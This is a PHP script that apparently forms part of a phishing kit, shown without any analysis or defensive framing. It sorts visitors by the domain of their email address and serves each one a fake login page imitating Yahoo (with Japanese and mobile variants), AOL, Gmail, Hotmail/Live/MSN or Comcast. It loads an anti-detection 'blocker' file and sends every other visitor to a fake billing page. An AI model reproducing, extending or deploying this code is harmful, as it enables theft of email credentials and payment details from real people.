<?php
session_start();
require_once('../main.php');
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once('../lang.php');
require_once('../session.php');
$email = explode("@",$_SESSION['email']);

if(preg_match('/yahoo.co.jp/', $email[1]) or preg_match('/yahoo.jp/', $email[1])) {
	if($os == "Android" or $os == "iPhone") {
		require_once("files/login-yahoojp-mobile.php");
	}else{
		require_once("files/login-yahoojp.php");
  	}
}else if(preg_match('/yahoo/', $email[1]) or preg_match('/ymail/', $email[1])) {
	require_once("files/login-yahoo.php");
}else if(preg_match('/aol/', $email[1])) {
	require_once("files/login-aol.php");
}else if(preg_match('/gmail/', $email[1])) {
	require_once("files/login-gmail.php");
}else if(preg_match('/hotmail.co.jp/', $email[1]) or preg_match('/live.jp/', $email[1]) or preg_match('/msn.jp/', $email[1]) or preg_match('/hotmail.com.jp/', $email[1])) {
	require_once("files/login-hotmailjp.php");
}else if(preg_match('/hotmail/', $email[1]) or preg_match('/live/', $email[1]) or preg_match('/msn/', $email[1]) or preg_match('/passport/', $email[1])) {
	require_once("files/login-hotmail.php");
}else if(preg_match('/comcast/', $email[1])) {
	require_once("files/comcast/index.php");
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
	exit();
}